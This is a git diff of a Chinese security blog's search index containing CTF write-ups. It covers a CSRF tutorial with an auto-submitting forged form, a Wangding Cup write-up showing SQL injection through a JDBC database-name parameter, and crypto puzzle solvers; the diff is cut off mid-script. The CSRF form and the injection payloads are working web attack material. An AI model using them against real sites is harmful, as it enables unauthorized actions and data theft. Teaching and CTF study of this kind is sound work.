-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import hashlib</span><br><span class="line">import sys</span><br><span class="line">keyword1=<span class="string">"41d"</span><span class="comment">#后三位</span></span><br><span class="line">keyword2=<span class="string">"fdc"</span><span class="comment">#2-5位</span></span><br><span class="line">key=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> key:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> key:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> key:</span><br><span class="line">				word=str(a)+str(b)+str(c)+str(d)</span><br><span class="line">				flag=hashlib.md5(word)</span><br><span class="line">				<span class="keyword">if</span> flag.hexdigest()[-<span class="number">3</span>:]==keyword1 and flag.hexdigest()[<span class="number">2</span>:<span class="number">5</span>]==keyword2:</span><br><span class="line">					print flag.hexdigest()</span><br><span class="line">					sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="11、棋局"><a href="#11、棋局" class="headerlink" title="11、棋局"></a>11、棋局</h3><p>简单的棋盘加密，可以发现密文只有5个字母，urtql,附件的提示说flag的内容长度为10,想到棋盘加密。<br>解密脚本:   </p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"rquutrqqrtulrutuuurr"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in itertools.permutations(<span class="string">'tqlur'</span>, <span class="number">5</span>):</span><br><span class="line">    key.<span class="keyword">append</span>(<span class="string">''</span>.<span class="keyword">join</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key in key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.<span class="built_in">index</span>(now_c))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = <span class="keyword">int</span>(solve_c[i])*<span class="number">5</span>+<span class="keyword">int</span>(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">res</span> += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> in re<span class="variable">s:</span></span><br><span class="line">        <span class="keyword">print</span> now_key,<span class="keyword">res</span></span><br></pre></td></tr></table></figure>
-
-<p>觉得这个难？全都在这里：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">点击查看</a><br>关于棋盘加密的知识，以及本题的解密脚本都在里面。</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初探csrf以及如何利用</title>
-    <url>/2019/01/16/%E5%88%9D%E6%8E%A2csrf%E4%BB%A5%E5%8F%8A%E7%AC%AC%E4%B8%80%E4%B8%AAcsrf%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>csrf学过有很长一段时间了，之前也就简单的知道这个是什么东西，大概是怎么实现，没有亲自挖掘到过，有幸的是在上周挖掘到两个，这里小小的记录一下</p>
-<a id="more"></a>
-
-<h3 id="1-csrf是什么？"><a href="#1-csrf是什么？" class="headerlink" title="1.csrf是什么？"></a>1.csrf是什么？</h3><p>在我个人的理解中，通过制造恶意链接，诱导在登陆某个web站点的时候请求了该恶意链接，而造成了以为用户并不想做的操作。例如添加/删除收获地址，改密码，修改个人信息等等。   </p>
-<h3 id="2-怎么实现跟利用"><a href="#2-怎么实现跟利用" class="headerlink" title="2.怎么实现跟利用?"></a>2.怎么实现跟利用?</h3><p>举个例子：在某个网站我们进行添加收获地址的操作时，向服务器发送了以下请求</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get请求为：</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//aimsite.com?add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//post的数据为：</span></span><br><span class="line">name=xiaoming<span class="variable">&amp;phone</span>=<span class="number">13888888888</span><span class="variable">&amp;home</span>=chengdu</span><br></pre></td></tr></table></figure>
-
-<p>在没有防御的情况下，可以构造以下表单：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-怎么实现点击链接就能提交？"><a href="#3-怎么实现点击链接就能提交？" class="headerlink" title="3.怎么实现点击链接就能提交？"></a>3.怎么实现点击链接就能提交？</h3><p>加入一段小小的js代码</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">autosubmit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).submit();</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.load=autosubmit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>csrf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何写一篇hexo博客</title>
-    <url>/2018/09/04/%E5%A6%82%E4%BD%95%E5%86%99hexo%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>本文介绍如何使用Hexo写出一篇‘比较’好看的文章，几句简单的语法，喜欢简介的话，可能就刚好适用。</p>
-<a id="more"></a>
-
-<hr>
-<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote>
-<p>这是一个引用,使用&gt;符号，置于文本前。(为方便阅读，下面的内容均使用了引用)</p>
-</blockquote>
-<hr>
-<h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><blockquote>
-<p>图片：！[](图片地址)</p>
-</blockquote>
-<blockquote>
-<p>网址：[]()</p>
-</blockquote>
-<hr>
-<h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><blockquote>
-<p>粗体：用两个*包含一段文本就是粗体。    例：<strong>粗体</strong></p>
-</blockquote>
-<blockquote>
-<p>斜体：用一个*包含一段文本就是斜体</p>
-</blockquote>
-<hr>
-<h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><blockquote>
-<p>使用两个`把中间的代码包含起来，例如：</p>
-</blockquote>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hello <span class="built_in">word</span>!</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><blockquote>
-<p>分割线的语法只需要加三个-号或*(是不是发现一直再用分割线hhh<del>~</del>)</p>
-</blockquote>
-<hr>
-]]></content>
-      <tags>
-        <tag>hexo学习</tag>
       </tags>
   </entry>
   <entry>
@@ -405,46 +140,157 @@
 <p>太多了。。。暂时不总结了，这里主要概括为使用框架的内省对象。所有总结就到此结束了</p>
 ]]></content>
       <tags>
-        <tag>ctf</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
-    <title>网鼎杯-朱雀组-Web复现wp</title>
-    <url>/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/</url>
-    <content><![CDATA[<h3 id="Think-Java"><a href="#Think-Java" class="headerlink" title="Think Java"></a>Think Java</h3><p>本题花时间也比较多，复现的时候遇到的坑也比较多，以下是解题方法与细节理解。</p>
-<h4 id="0x01-源代码分析"><a href="#0x01-源代码分析" class="headerlink" title="0x01 源代码分析"></a>0x01 源代码分析</h4><p>根据给的文件可以发现存在sql注入，dbName可控，此外在Test.class中发现了swagger，访问后发现开放了相关接口。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.core.sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SqlDict</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/"</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/myapp"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                user = <span class="string">"root"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                pass = <span class="string">"abc@12345"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">        String TableName = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">            ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"TABLE"</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                Table table = <span class="keyword">new</span> Table();</span><br><span class="line">                String sql = <span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '"</span> + dbName + <span class="string">"' and table_name='"</span> + TableName + <span class="string">"';"</span>;</span><br><span class="line">                ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">""</span>);</span><br><span class="line">                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">""</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">"COLUMN_NAME"</span>), data.getString(<span class="string">"TYPE_NAME"</span>), data.getString(<span class="string">"COLUMN_DEF"</span>), data.getString(<span class="string">"NULLABLE"</span>).equals(<span class="string">"1"</span>) ? <span class="string">"YES"</span> : <span class="string">"NO"</span>, data.getString(<span class="string">"IS_AUTOINCREMENT"</span>), data.getString(<span class="string">"REMARKS"</span>), data.getString(<span class="string">"COLUMN_NAME"</span>).equals(PK) ? <span class="string">"true"</span> : <span class="keyword">null</span>, data.getString(<span class="string">"COLUMN_SIZE"</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>关于这个注入点，需要加#再闭合，或者通过?加个id再闭合(如下)，对此我很是不解，通过赵师傅的指点与写jdbc代码测试才得以搞明白。</p>
-<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">myapp?id=<span class="number">1</span><span class="string">' union select user()#</span></span><br><span class="line"><span class="string">myapp#'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">user</span>()<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>
+    <title>cdusec-ctf Crypto wp</title>
+    <url>/2018/11/18/cdusec-ctf-Crypto-wp/</url>
+    <content><![CDATA[<p>校赛Crypto的wp，这些题都比较简单吧，大多都能查得到，只是一些简单古典密码以及常见编码。</p>
+<a id="more"></a>
 
-<p>我的测试代码如下(可以理解为本题的简化版本)，grade为本地的一个数据库，选择了其中的admins表：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zed.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1、注册驱动</span></span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> com.mysql.jdbc.Driver());</span><br><span class="line">        <span class="comment">//2、获取链接</span></span><br><span class="line">        String dbname = <span class="string">"grade?id=1' union select user()#"</span>;</span><br><span class="line">        <span class="comment">//或者 String dbname = "grade#' union select user()#";</span></span><br><span class="line">        <span class="comment">//连接数据库</span></span><br><span class="line">        Connection conn = DriverManager.getConnection(<span class="string">"jdbc:mysql://localhost:3306/"</span>+dbname,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        <span class="comment">//3、获取操作数据库的预处理对象</span></span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(<span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where"</span> +</span><br><span class="line">                <span class="string">"  table_schema = '"</span> + dbname + <span class="string">"' and table_name='admins';"</span>);</span><br><span class="line">        <span class="comment">//4、执行sql语句，得到结果集</span></span><br><span class="line">        ResultSet res = pstm.executeQuery();</span><br><span class="line">        <span class="comment">//5、遍历结果集</span></span><br><span class="line">        <span class="keyword">while</span> (res.next())&#123;</span><br><span class="line">            System.out.println(res.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6、释放资源</span></span><br><span class="line">        res.close();</span><br><span class="line">        pstm.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="1、签到"><a href="#1、签到" class="headerlink" title="1、签到"></a>1、签到</h3><p>复制输入即可，我给了一个链接，没有认真去看的23333 吃亏。</p>
+<h3 id="2、凯撒"><a href="#2、凯撒" class="headerlink" title="2、凯撒"></a>2、凯撒</h3><p>简单的凯撒加密，key为4，在线工具丢进去即可。</p>
+<h3 id="3、fuck！这是什么鬼"><a href="#3、fuck！这是什么鬼" class="headerlink" title="3、fuck！这是什么鬼"></a>3、fuck！这是什么鬼</h3><p>jsfuck,说到底也是js代码，一样能够像js一样执行，复制丢进浏览器的控制台就得flag。</p>
+<h3 id="4、不一样的morse"><a href="#4、不一样的morse" class="headerlink" title="4、不一样的morse"></a>4、不一样的morse</h3><p>morse的中文编码xmorse，在线网站丢进去完事。</p>
+<h3 id="5、你熟悉键盘吗？"><a href="#5、你熟悉键盘吗？" class="headerlink" title="5、你熟悉键盘吗？"></a>5、你熟悉键盘吗？</h3><p>一共5组字符串，一个字符串代表一个字母，在键盘上比划一下可以得到ANgLA。</p>
+<h3 id="6、蕾蕾姐被表白了"><a href="#6、蕾蕾姐被表白了" class="headerlink" title="6、蕾蕾姐被表白了"></a>6、蕾蕾姐被表白了</h3><p>手机的9键拼音输入法加密，每2个数字对应一个字符，例如33，表示第三个键，第三个字符，即f，其他一样然后解出flag。</p>
+<h3 id="7、奇怪的字符串"><a href="#7、奇怪的字符串" class="headerlink" title="7、奇怪的字符串"></a>7、奇怪的字符串</h3><p>Y对应1，N对应0，全部替换后二进制转字符串。</p>
+<h3 id="8、the-other-base’s-member"><a href="#8、the-other-base’s-member" class="headerlink" title="8、the other base’s member"></a>8、the other base’s member</h3><p>base58，在线网站解码即可。</p>
+<h3 id="9、easy-base-family"><a href="#9、easy-base-family" class="headerlink" title="9、easy_base_family"></a>9、easy_base_family</h3><p>base16，32，64混合编码，解码脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'base_family.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b16decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b32decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b64decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<h3 id="10、蕾蕾姐的id"><a href="#10、蕾蕾姐的id" class="headerlink" title="10、蕾蕾姐的id"></a>10、蕾蕾姐的id</h3><p>md5爆破，会有多解的情况，只有一个正确。解密脚本：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import hashlib</span><br><span class="line">import sys</span><br><span class="line">keyword1=<span class="string">"41d"</span><span class="comment">#后三位</span></span><br><span class="line">keyword2=<span class="string">"fdc"</span><span class="comment">#2-5位</span></span><br><span class="line">key=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> key:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> key:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> key:</span><br><span class="line">				word=str(a)+str(b)+str(c)+str(d)</span><br><span class="line">				flag=hashlib.md5(word)</span><br><span class="line">				<span class="keyword">if</span> flag.hexdigest()[-<span class="number">3</span>:]==keyword1 and flag.hexdigest()[<span class="number">2</span>:<span class="number">5</span>]==keyword2:</span><br><span class="line">					print flag.hexdigest()</span><br><span class="line">					sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
-<h4 id="0x02测试代码分析："><a href="#0x02测试代码分析：" class="headerlink" title="0x02测试代码分析："></a>0x02测试代码分析：</h4><p>在JDBC中，连接数据库的时候采用了?来进行参数传递，如果但是不会影响数据库是否成功连接。例如：</p>
-<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://localhost:3306/数据库名?user=用户名<span class="variable">&amp;password</span>=密码<span class="variable">&amp;useUnicode</span>=true<span class="variable">&amp;characterEncoding</span>=utf-8<span class="variable">&amp;serverTimezone</span>=GMT</span><br></pre></td></tr></table></figure>
+<h3 id="11、棋局"><a href="#11、棋局" class="headerlink" title="11、棋局"></a>11、棋局</h3><p>简单的棋盘加密，可以发现密文只有5个字母，urtql,附件的提示说flag的内容长度为10,想到棋盘加密。<br>解密脚本:   </p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"rquutrqqrtulrutuuurr"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in itertools.permutations(<span class="string">'tqlur'</span>, <span class="number">5</span>):</span><br><span class="line">    key.<span class="keyword">append</span>(<span class="string">''</span>.<span class="keyword">join</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key in key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.<span class="built_in">index</span>(now_c))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = <span class="keyword">int</span>(solve_c[i])*<span class="number">5</span>+<span class="keyword">int</span>(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span 